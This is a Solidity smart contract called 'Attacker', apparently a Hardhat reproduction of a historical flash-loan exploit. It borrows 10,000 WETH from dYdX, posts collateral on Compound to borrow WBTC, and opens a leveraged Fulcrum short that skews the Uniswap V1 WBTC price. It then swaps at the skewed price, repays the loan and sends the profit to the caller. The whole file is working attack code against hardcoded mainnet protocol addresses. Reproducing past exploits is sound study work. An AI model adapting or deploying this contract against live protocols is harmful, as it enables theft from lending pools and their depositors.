pragma solidity >=0.8.0;

import "hardhat/console.sol";
import "../interfaces/IWETH.sol";
import "../interfaces/IDydxSoloMargin.sol";
import "../interfaces/IUnitroller.sol";
import "../interfaces/ICompoundToken.sol";
import "../interfaces/IUniswapV1.sol";
import "../interfaces/IERC20.sol";

interface IFulcrumPerpShort {
    function mintWithEther(address receiver, uint256 maxPriceAllowed) external payable returns (uint256);
}

contract Attacker {

    IDydxSoloMargin public constant dydxSolo = IDydxSoloMargin(0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e);
    IWETH public constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUnitroller unitroller = IUnitroller(0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B);
    ICompoundToken cBTC = ICompoundToken(0xC11b1268C1A384e55C48c2391d8d480264A3A7F4);
    ICompoundToken cETH = ICompoundToken(0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5);
    IERC20 WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IFulcrumPerpShort fulcrumPerpShort = IFulcrumPerpShort(0xb0200B0677dD825bb32B93d055eBb9dc3521db9D);
    IUniswapV1 uniswapV1WBTC = IUniswapV1(0x4d2f5cFbA55AE412221182D8475bC85799A5644b);

    function attack() external payable {
        AccountInfo[] memory accounts = new AccountInfo[](1);
        accounts[0] = AccountInfo(address(this), 0);
        AssetAmount memory borrowAmount = AssetAmount(false, AssetDenomination(0), AssetReference(0), 10000000000000000000000);
        ActionArgs[] memory actions = new ActionArgs[](3);

        // borrow 10000 WETH
        actions[0] = ActionArgs(1, 0, borrowAmount, 0, 0, address(this), 0, "");

        // exploit
        bytes memory data = abi.encodeWithSelector(Attacker.attack2.selector);
        console.logBytes(data);
        AssetAmount memory borrowAmountPositive = AssetAmount(true, AssetDenomination(0), AssetReference(0), 10000000000000000000000);
        actions[1] = ActionArgs(8, 0, borrowAmount, 0, 0, address(this), 0, data);

        // deposit back the 10000 WETH
        AssetAmount memory returnAmount = AssetAmount(true, AssetDenomination(0), AssetReference(0), 10000000000000010000000);
        actions[2] = ActionArgs(0, 0, returnAmount, 0, 0, address(this), 0, "");

        //Check if method selector is same as in the actual contract
        bytes memory operateMethodSelector = abi.encodeWithSelector(dydxSolo.operate.selector);
        console.logBytes(operateMethodSelector);

        dydxSolo.operate(accounts, actions);

        payable(tx.origin).transfer(address(this).balance);
    }

    //REVIEW: require statements to cancel tx, in case smth. went wrong
    function attack2() external payable {
        console.log("test attack2");
        WETH.withdraw(10000 ether);

        address[] memory markets = new address[](2);
        markets[0] = address(cBTC);
        markets[1] = address(cETH);
        unitroller.enterMarkets(markets);

        cETH.mint{value: 5500 ether}();
        uint balanceCETH = cETH.balanceOfUnderlying(address(this)); // accrues interest,hence not read-only
        console.log("balanceOfUnderlying: %s", balanceCETH);
        //REVIEW: borrowAmount taken from exploit tx, maybe should be calculated
        uint cbtcBorrowAmount = 11200000000;
        cBTC.borrow(cbtcBorrowAmount);
        WBTC.approve(address(uniswapV1WBTC), cbtcBorrowAmount);

        fulcrumPerpShort.mintWithEther{value: 1300 ether}(address(this), 0);

        console.log("mint done");

        WBTC.balanceOf(address(this));
        uniswapV1WBTC.tokenToEthSwapInput(cbtcBorrowAmount, 1, 4294967295);

        console.log("uniswap done");

        console.log("ether balance of attacker contract after uniswap: %s", address(this).balance);

        WETH.deposit{value:10000000000000010000000}();
        WETH.transfer(address(this), 10000000000000010000000);
        WETH.approve(address(dydxSolo), 10000000000000010000000);

        console.log("minted back the 10k WETH");
    }

    fallback() external payable {
        console.logBytes(msg.data);
    }

    function callFunction(
        address sender,
        AccountInfo memory accountInfo,
        bytes memory data
    ) external {
        this.attack2();
    }
}

